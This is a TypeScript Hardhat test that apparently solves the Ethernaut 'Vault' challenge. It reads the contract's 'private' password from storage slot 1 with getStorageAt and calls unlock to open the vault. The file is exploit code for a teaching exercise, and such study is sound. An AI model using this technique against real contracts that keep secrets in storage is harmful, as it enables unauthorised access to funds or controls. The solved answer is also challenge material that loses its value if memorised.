import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0xf94b476063B6379A3c8b6C836efB8B3e10eDe188";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;

describe("Vault", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const contractFactory = await ethers.getContractFactory("Vault");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await contractFactory.attach(challengeAddr);
    });

    it("Should solve the challenge", async function () {
        expect(await contract.locked()).to.be.true;
        expect(await submitInstance(contract.address)).to.be.false;
        
        // getStorageAt is a low level function that accesses the storage
        // storage is just a key-value store with position being the order in contract definition
        const locked = await owner.provider?.getStorageAt(contract.address, 0);
        const password = await owner.provider?.getStorageAt(contract.address, 1);
    
        txn = await contract.unlock(password);
        await txn.wait();

        expect(await contract.locked()).to.be.false;
        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});